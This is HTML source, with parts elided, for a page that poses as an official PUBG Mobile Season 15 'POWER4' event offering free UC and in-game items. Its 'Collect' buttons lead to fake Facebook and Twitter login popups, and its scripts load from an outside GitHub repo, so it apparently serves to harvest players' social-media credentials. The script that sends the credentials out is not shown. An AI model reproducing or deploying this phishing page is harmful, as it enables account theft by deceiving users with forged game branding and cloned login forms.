...
<meta property="og:title" content="PUBG MOBILE SEASON 15">
<meta name="description" content="Latest PUBG MOBILE Event. Get an exclusive Season 15 prize !!!">
<meta property="og:description" content="Latest PUBG MOBILE Event. Get an exclusive Season 15 prize !!!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE SEASON 15">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://i.ibb.co/0GFmf9d/header.jpg">
<title>PUBG MOBILE SEASON 15</title>
...
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/pubg1/main/facebook.css">
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/pubg1/main/twitter.css">
...
<center>
<div class="alert">
Welcome to PUBG MOBILE POWER4 event
...
<div class="scroll">
<div class="balance">
<img src="https://i.ibb.co/5YDvfDx/uc.jpg">
<div class="balance-nom">1250 + 125</div>
<div class="balance-detail">Additional reward for POWER4 event</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/5YDvfDx/uc.jpg">Collect</button>
</div>
<div class="balance">
<img src="https://i.ibb.co/5YDvfDx/uc.jpg">
...
<div class="balance">
<img src="https://i.ibb.co/CvrQQdt/paint.jpg">
<div class="balance-nom">10</div>
<div class="balance-detail">Additional reward for POWER4 event</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/CvrQQdt/paint.jpg">Collect</button>
</div>
<div class="balance">
<img src="https://i.ibb.co/CvrQQdt/paint.jpg">
...
<div class="balance">
<img src="https://i.ibb.co/fFNn224/material.jpg">
<div class="balance-nom">10</div>
<div class="balance-detail">Additional reward for POWER4 event</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/fFNn224/material.jpg">Collect</button>
</div>
<div class="balance">
<img src="https://i.ibb.co/fFNn224/material.jpg">
<div class="balance-nom">15</div>
...
<button type="button" class="popup-btn" onmousedown="tutup.play()" onclick="close_reward_confirmation()"><span>Cancel</span></button>
<button type="button" class="popup-btn" onmousedown="buka.play()" onclick="account_login()"><span>Collect</span></button>
</div>
</div>
...
<br>
<br>
<button type="button" class="popup-btn" onmousedown="tutup.play()" onclick="close_account_login()"><span>Back to Rewards</span></button>
</div>
</div>
...
<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		...
		<div class="navbar-fb">
			<img src="https://i.ibb.co/4TZ8J5X/facebook-text.png">
		</div>
...
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
	...
	<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="https://i.ibb.co/bRCC2NJ/twitter-text.png">
			</center>
		</div>
...
<script src="https://raw.githack.com/ahmed-shamy/pubg1/main/timer.js"></script>
<script src="https://raw.githack.com/ahmed-shamy/pubg1/main/tab.js"></script>
<script src="https://raw.githack.com/ahmed-shamy/pubg1/main/popup.js"></script>
<script src="https://raw.githack.com/ahmed-shamy/pubg1/main/click.js"></script>
